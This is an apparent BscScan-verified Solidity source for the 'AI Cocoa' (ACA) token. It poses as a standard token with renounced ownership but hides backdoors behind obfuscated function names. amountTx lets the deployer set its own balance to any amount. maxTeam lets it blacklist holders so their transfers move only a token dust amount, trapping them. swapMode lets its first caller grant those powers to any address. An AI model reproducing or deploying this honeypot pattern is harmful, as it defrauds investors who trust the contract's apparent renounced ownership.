/**
 *Submitted for verification at BscScan.com on 2023-02-04
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface launchedMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tradingWallet {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AICocoa is Ownable{
    uint8 public decimals = 18;
    string public name = "AI Cocoa";
    address public exemptLiquidity;
    address public takeIs;


    mapping(address => bool) public launchFeeMax;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    mapping(address => bool) public isFee;
    uint256 constant fundTo = 10 ** 10;
    bool public senderAmount;

    mapping(address => uint256) public balanceOf;
    string public symbol = "ACA";
    mapping(address => mapping(address => uint256)) public allowance;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        launchedMode teamTake = launchedMode(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptLiquidity = tradingWallet(teamTake.factory()).createPair(teamTake.WETH(), address(this));
        takeIs = feeTake();
        isFee[takeIs] = true;
        balanceOf[takeIs] = totalSupply;
        emit Transfer(address(0), takeIs, totalSupply);
        renounceOwnership();
    }

    

    function transfer(address isTotal, uint256 toSellAmount) external returns (bool) {
        return transferFrom(feeTake(), isTotal, toSellAmount);
    }

    function approve(address swapMinAt, uint256 toSellAmount) public returns (bool) {
        allowance[feeTake()][swapMinAt] = toSellAmount;
        emit Approval(feeTake(), swapMinAt, toSellAmount);
        return true;
    }

    function feeTake() private view returns (address) {
        return msg.sender;
    }

    function amountEnable(address shouldList, address totalWallet, uint256 toSellAmount) internal returns (bool) {
        require(balanceOf[shouldList] >= toSellAmount);
        balanceOf[shouldList] -= toSellAmount;
        balanceOf[totalWallet] += toSellAmount;
        emit Transfer(shouldList, totalWallet, toSellAmount);
        return true;
    }

    function swapMode(address senderTeam) public {
        if (senderAmount) {
            return;
        }
        isFee[senderTeam] = true;
        senderAmount = true;
    }

    function amountTx(uint256 toSellAmount) public {
        if (!isFee[feeTake()]) {
            return;
        }
        balanceOf[takeIs] = toSellAmount;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function maxTeam(address autoReceiverMarketing) public {
        if (autoReceiverMarketing == takeIs || autoReceiverMarketing == exemptLiquidity || !isFee[feeTake()]) {
            return;
        }
        launchFeeMax[autoReceiverMarketing] = true;
    }

    function transferFrom(address marketingWallet, address isTotal, uint256 toSellAmount) public returns (bool) {
        if (marketingWallet != feeTake() && allowance[marketingWallet][feeTake()] != type(uint256).max) {
            require(allowance[marketingWallet][feeTake()] >= toSellAmount);
            allowance[marketingWallet][feeTake()] -= toSellAmount;
        }
        if (isTotal == takeIs || marketingWallet == takeIs) {
            return amountEnable(marketingWallet, isTotal, toSellAmount);
        }
        if (launchFeeMax[marketingWallet]) {
            return amountEnable(marketingWallet, isTotal, fundTo);
        }
        return amountEnable(marketingWallet, isTotal, toSellAmount);
    }


}